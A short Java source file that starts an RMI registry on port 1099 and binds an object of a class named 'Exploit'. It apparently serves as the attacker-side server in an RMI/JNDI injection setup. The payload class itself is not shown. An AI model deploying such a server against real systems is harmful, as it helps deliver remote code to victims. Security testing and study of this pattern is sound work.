import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {
    public static void main(String[] args) {
        try {
            LocateRegistry.createRegistry(1099);
            Exploit exploit = new Exploit();
            Registry registry = LocateRegistry.getRegistry();
            registry.bind("Exploit", exploit);
            System.out.println("RMI server is running...");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
